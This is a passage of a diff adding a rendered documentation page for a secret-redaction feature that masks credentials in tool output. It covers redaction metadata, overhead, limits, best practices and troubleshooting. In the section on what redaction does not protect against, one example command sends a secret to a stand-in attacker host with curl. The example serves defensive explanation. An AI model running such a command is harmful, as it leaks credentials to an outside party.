+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>⚠️  SECRET REDACTION: 1 secret redacted from output
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>[REDACTED PRIVATE KEY] # notsecret
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>Redactions:
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>  • Private Key at position 0 (full redact)
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>🚨 CRITICAL: Private key completely redacted for security
+</code></pre></div></p>
+<hr />
+<h2 id="redaction-metadata">Redaction Metadata<a class="headerlink" href="#redaction-metadata" title="Permanent link">&para;</a></h2>
+<p>Each redaction includes metadata for audit and debugging:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="p">{</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;OpenAI API Key&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="w">  </span><span class="nt">&quot;position&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42</span><span class="p">,</span>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">  </span><span class="nt">&quot;original_length&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">64</span><span class="p">,</span>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="w">  </span><span class="nt">&quot;redacted_length&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">13</span><span class="p">,</span>
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">  </span><span class="nt">&quot;strategy&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;preserve_prefix_suffix&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;preserve_prefix_suffix&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="w">  </span><span class="nt">&quot;preserved_chars&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="metadata-fields">Metadata Fields<a class="headerlink" href="#metadata-fields" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>type</code></td>
+<td>Secret type (e.g., "OpenAI API Key", "AWS Secret Key")</td>
+</tr>
+<tr>
+<td><code>position</code></td>
+<td>Character position in original text where secret was found</td>
+</tr>
+<tr>
+<td><code>original_length</code></td>
+<td>Length of original secret (for audit)</td>
+</tr>
+<tr>
+<td><code>redacted_length</code></td>
+<td>Length of redacted placeholder</td>
+</tr>
+<tr>
+<td><code>strategy</code></td>
+<td>Masking strategy used</td>
+</tr>
+<tr>
+<td><code>method</code></td>
+<td>Specific redaction method applied</td>
+</tr>
+<tr>
+<td><code>preserved_chars</code></td>
+<td>Number of characters preserved (if applicable)</td>
+</tr>
+<tr>
+<td><code>var_name</code></td>
+<td>Variable name (for env assignments)</td>
+</tr>
+<tr>
+<td><code>field_name</code></td>
+<td>Field name (for JSON)</td>
+</tr>
+<tr>
+<td><code>context</code></td>
+<td>Context keyword (for context-aware redaction)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="performance-impact">Performance Impact<a class="headerlink" href="#performance-impact" title="Permanent link">&para;</a></h2>
+<p>Secret redaction is <strong>highly optimized</strong> for minimal overhead:</p>
+<ul>
+<li><strong>Pattern compilation:</strong> One-time cost at startup (~10ms for 35+ patterns)</li>
+<li><strong>Scanning:</strong> O(n) single pass with compiled regex (~0.5ms per 1000 chars)</li>
+<li><strong>Redaction:</strong> In-place string replacement (~0.1ms per match)</li>
+</ul>
+<p><strong>Total overhead:</strong> &lt;1ms for typical tool outputs (&lt; 10KB)</p>
+<p><strong>Memory:</strong> ~500KB for compiled patterns + metadata</p>
+<hr />
+<h2 id="security-considerations">Security Considerations<a class="headerlink" href="#security-considerations" title="Permanent link">&para;</a></h2>
+<h3 id="what-secret-redaction-protects-against">What Secret Redaction Protects Against<a class="headerlink" href="#what-secret-redaction-protects-against" title="Permanent link">&para;</a></h3>
+<p>✅ <strong>Accidental exposure in logs</strong>
+- Secrets in tool outputs are automatically masked
+- Prevents credentials from appearing in chat history
+- Reduces risk of shoulder-surfing attacks</p>
+<p>✅ <strong>Copy-paste mistakes</strong>
+- Redacted output can be safely shared
+- Reduces risk of pasting secrets into Slack/email
+- Safe to screenshot for bug reports</p>
+<p>✅ <strong>Debugging without credential exposure</strong>
+- Preserves context (endpoints, variable names) for debugging
+- Allows work to continue without seeing actual secrets
+- Balance between security and productivity</p>
+<h3 id="what-it-does-not-protect-against">What It Does NOT Protect Against<a class="headerlink" href="#what-it-does-not-protect-against" title="Permanent link">&para;</a></h3>
+<p>❌ <strong>Secrets being written to files</strong>
+- Secret redaction only affects <em>output display</em>
+- Does NOT prevent secrets from being written to disk
+- Use secret scanning to prevent secret commits</p>
+<p>❌ <strong>Secrets in command parameters</strong>
+- Redaction happens <em>after</em> command execution
+- Command with <code>curl https://evil.com?key=$SECRET</code> still executes
+- Use SSRF protection and input validation</p>
+<p>❌ <strong>Memory dumps or process inspection</strong>
+- Original secrets exist in memory before redaction
+- Process memory can be dumped by attacker
+- Use secure credential storage (vaults, keychains)</p>
+<p>❌ <strong>Network transmission</strong>
+- Secrets may be sent over network before redaction
+- Redaction happens after response received
+- Use TLS and credential rotation</p>
+<h3 id="defense-in-depth">Defense in Depth<a class="headerlink" href="#defense-in-depth" title="Permanent link">&para;</a></h3>
+<p>Secret Redaction is <strong>one layer</strong> in a comprehensive security strategy:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Layer 1: Prevention (Secret Scanning)
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>  ↓ If secrets slip through...
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>Layer 2: Redaction (Secret Redaction) ← YOU ARE HERE
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>  ↓ If redaction fails...
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>Layer 3: Detection (Credential Monitoring)
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>  ↓ If secrets are compromised...
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>Layer 4: Response (Rotation &amp; Revocation)
+</code></pre></div>
+<hr />
+<h2 id="best-practices">Best Practices<a class="headerlink" href="#best-practices" title="Permanent link">&para;</a></h2>
+<h3 id="for-developers">For Developers<a class="headerlink" href="#for-developers" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Don't rely on redaction alone</strong> - Prevent secrets from being written in the first place</li>
+<li><strong>Review redaction warnings</strong> - Investigate why a secret appeared in output</li>
+<li><strong>Use credential vaults</strong> - Store secrets in HashiCorp Vault, AWS Secrets Manager, etc.</li>
+<li><strong>Rotate exposed secrets</strong> - If a secret appears in output, rotate it immediately</li>
+</ol>
+<h3 id="for-security-teams">For Security Teams<a class="headerlink" href="#for-security-teams" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Enable in production</strong> - Redact secrets in all environments</li>
+<li><strong>Monitor redaction logs</strong> - Track where secrets are appearing</li>
+<li><strong>Audit patterns</strong> - Regularly review and update secret patterns</li>
+<li><strong>Combine with scanning</strong> - Use both secret scanning (prevention) and redaction (defense)</li>
+</ol>
+<h3 id="for-compliance">For Compliance<a class="headerlink" href="#for-compliance" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Log all redactions</strong> - Maintain audit trail of secret exposure</li>
+<li><strong>Pattern server</strong> - Centralize pattern management for consistency</li>
+<li><strong>Regular testing</strong> - Test redaction with sample secrets</li>
+<li><strong>Incident response</strong> - Define process for when secrets are exposed</li>
+</ol>
+<hr />
+<h2 id="troubleshooting">Troubleshooting<a class="headerlink" href="#troubleshooting" title="Permanent link">&para;</a></h2>
+<h3 id="secrets-not-being-redacted">Secrets Not Being Redacted<a class="headerlink" href="#secrets-not-being-redacted" title="Permanent link">&para;</a></h3>
+<p><strong>Problem:</strong> Known secret type not being redacted.</p>
+<p><strong>Solutions:</strong>
+1. Check pattern matches your secret format
+2. Verify <code>enabled: true</code> in config
+3. Check pattern compilation errors in logs
+4. Add custom pattern if needed</p>
+<h3 id="too-many-false-positives">Too Many False Positives<a class="headerlink" href="#too-many-false-positives" title="Permanent link">&para;</a></h3>
+<p><strong>Problem:</strong> Non-secrets being redacted (e.g., git commit SHAs).</p>
+<p><strong>Solutions:</strong>
+1. Generic hex/base64 patterns require context keywords
+2. Minimum length thresholds (40+ chars for hex, 100+ for base64)
+3. Adjust patterns to be more specific
+4. Use <code>log_redactions: true</code> to see what's matching</p>
+<h3 id="performance-issues">Performance Issues<a class="headerlink" href="#performance-issues" title="Permanent link">&para;</a></h3>
+<p><strong>Problem:</strong> Redaction causing noticeable slowdown.</p>
+<p><strong>Solutions:</strong>
+1. Reduce number of custom patterns
+2. Optimize regex patterns (avoid backtracking)
+3. Increase pattern cache size
+4. Consider disabling for very large outputs (&gt;1MB)</p>
+<hr />
+<h2 id="technical-details">Technical Details<a class="headerlink" href="#technical-details" title="Permanent link">&para;</a></h2>
+<h3 id="regex-pattern-validation">Regex Pattern Validation<a class="headerlink" href="#regex-pattern-validation" title="Permanent link">&para;</a></h3>
+<p>All patterns (hardcoded, pattern server, custom) are validated before compilation to prevent ReDoS attacks:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Pattern validation checks:</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="mf">1.</span> <span class="n">Catastrophic</span> <span class="n">backtracking</span> <span class="n">detection</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="mf">2.</span> <span class="n">Nested</span> <span class="n">quantifiers</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span><span class="p">,</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="p">)</span><span class="o">+</span><span class="p">)</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="mf">3.</span> <span class="n">Overlapping</span> <span class="n">character</span> <span class="n">classes</span>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="mf">4.</span> <span class="n">Exponential</span> <span class="n">complexity</span> <span class="n">patterns</span>
+</code></pre></div>
+<p>Invalid patterns are <strong>skipped</strong> with warning logged.</p>
+<h3 id="pattern-priority">Pattern Priority<a class="headerlink" href="#pattern-priority" title="Permanent link">&para;</a></h3>
+<p>Patterns are processed in <strong>priority order</strong> to prevent overlapping redactions:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>1. Specific patterns (OpenAI, GitHub, AWS)
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>2. Format-specific patterns (JSON, env vars)
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>3. Generic patterns (hex, base64) with context
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>4. Very long strings (100+ chars) without context
+</code></pre></div>
+<p>Once a region is redacted, it's marked and subsequent patterns skip it.</p>
+<h3 id="string-replacement-algorithm">String Replacement Algorithm<a class="headerlink" href="#string-replacement-algorithm" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="mf">1.</span> <span class="n">Find</span> <span class="nb">all</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">pattern</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="mf">2.</span> <span class="n">For</span> <span class="n">each</span> <span class="n">match</span><span class="p">:</span>
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>   <span class="n">a</span><span class="o">.</span> <span class="n">Check</span> <span class="k">if</span> <span class="n">region</span> <span class="n">already</span> <span class="n">redacted</span> <span class="err">→</span> <span class="n">skip</span>
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>   <span class="n">b</span><span class="o">.</span> <span class="n">Apply</span> <span class="n">masking</span> <span class="n">strategy</span> <span class="err">→</span> <span class="n">get</span> <span class="n">redacted</span> <span class="n">string</span>
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>   <span class="n">c</span><span class="o">.</span> <span class="n">Replace</span> <span class="ow">in</span> <span class="n">text</span>
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>   <span class="n">d</span><span class="o">.</span> <span class="n">Mark</span> <span class="n">region</span> <span class="k">as</span> <span class="n">redacted</span>
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>   <span class="n">e</span><span class="o">.</span> <span class="n">Adjust</span> <span class="n">future</span> <span class="n">positions</span> <span class="k">for</span> <span class="n">length</span> <span class="n">change</span>
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="mf">3.</span> <span class="n">Return</span> <span class="n">redacted</span> <span class="n">text</span> <span class="o">+</span> <span class="n">metadata</span>
+</code></pre></div>
+<hr />
+<h2 id="see-also">See Also<a class="headerlink" href="#see-also" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="../SECRET_SCANNING/">Secret Scanning</a> - Prevent secrets from being committed</li>
+<li><a href="../SSRF_PROTECTION/">SSRF Protection</a> - Prevent credential exfiltration</li>
+<li><a href="../CREDENTIAL_EXFILTRATION/">Credential Exfiltration</a> - Detect config file attacks</li>
+<li><a href="../../CONFIGURATION/">Configuration Guide</a> - Full configuration reference</li>
+</ul>
+<hr />
+<h2 id="version-history">Version History<a class="headerlink" href="#version-history" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>v1.5.0</strong> - Initial secret redaction (35+ types, 6 strategies)</li>
+<li><strong>v1.5.1</strong> - Pattern server support for enterprise deployment</li>
+<li><strong>v1.6.0</strong> - Enhanced performance, ReDoS protection, metadata improvements</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.indexes", "navigation.sections", "navigation.top", "search.highlight", "search.suggest"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
